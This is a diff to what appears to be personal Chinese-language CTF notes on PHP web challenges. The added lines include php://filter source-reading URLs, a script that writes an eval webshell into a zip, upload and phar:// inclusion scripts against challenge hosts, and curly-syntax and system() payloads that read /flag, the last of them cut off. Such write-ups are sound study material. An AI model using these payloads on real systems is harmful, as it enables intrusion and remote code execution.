@@ -1,5 +1,6 @@
 
 
+
 ## Love math
 
 ```php
@@ -96,6 +97,75 @@ for($k=1;$k<=sizeof($payload);$k++){
 `http://833b3035-65c8-45f0-aef4-8214e5f05661.node3.buuoj.cn/?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi{0}($pi{1})&0=system&1=cat%20/flag`
 
 
+
+# 文件上传
+
+## test.bugku-web-upload—文件上传与文件包含组合
+
+提示1 
+```php
+include.php
+```
+提示2
+```
+Tips: the parameter is file! :)
+<!-- upload.php -->
+```
+
+1.读取源码。 这里过滤了base64, 和.php。末尾不要留.php
+include.php?file=php://filter/read=convert.base64-encode/resource=include
+include.php?file=php://filter/string.rot13/resource=include.php
+include.php?file=php://filter/string.rot13/resource=include
+
+2.上传文件一句木马加zip。用phar或zip协议读取
+
+```python
+import zipfile
+
+def make_zipfile(filename, zipname='spam.zip'):
+    with zipfile.ZipFile(zipname, 'w') as myzip:
+        myzip.write(filename)
+
+
+if __name__=="__main__":
+    with open('basic.php', 'w') as f:
+        f.write('<?php eval($_POST["cmd"]);')
+    make_zipfile('basic.php', 'basic.zip')
+
+```
+```python
+import requests
+
+url = 'http://106.14.120.231:28805/upload.php'
+key = 'file'
+filename = 'basic.zip'
+
+data = {'submit': ''}
+proxies = {'http': 'http://127.0.0.1:8080'}
+def upload_file(filename, upload_filename=None):
+    if upload_filename is None:
+        upload_filename = filename
+    file = open(filename, 'rb').read()  # create an empty demo file
+    files = {key: (upload_filename, file, 'image/jpeg')}
+    send_request(data, filename, files, proxies, upload_filename)
+
+
+def send_request(data, filename, files, proxies, upload_filename=None):
+    res = requests.post(url, files=files, data=data, proxies=proxies)
+
+
+if __name__ == '__main__':
+    upload_file('basic.zip', 'basic.jpg')
+```
+读取内容, 成功后用蚁剑连接
+```python
+import requests
+
+url = 'http://106.14.120.231:28805/include.php'
+proxies = {'http': 'http://127.0.0.1:8080'}
+res = requests.post(url+ '?file=phar://upload/basic.jpg/basic', data={'cmd': 'phpinfo();'}, proxies=proxies)
+print(res.text)
+```
 
 # php 反序列化
 ## [第五空间 2021]pklovecloud
@@ -245,3 +315,12 @@ index()
 `python exp.py` 得到最终的cookie
 
 在devtools - Application - Cookies 替换user，再访问admin panel
+
+# 能源大赛
+
+php5的情况下
+https://www.bbsmax.com/A/6pdDvoERJw/
+”PHP的curly systax能导致代码执行，它将执行花括号间的代码，并将结果替换回去，如下例:
+<?php $var = "I was innocent until ${`ls`}" appeared here; ?>"
+
+//http://106.14.120.231:22808/?whoami[admin]=d41d8cd98f00b204e9800998ecf8427e&code=9${`cat%20/f???`};${require(
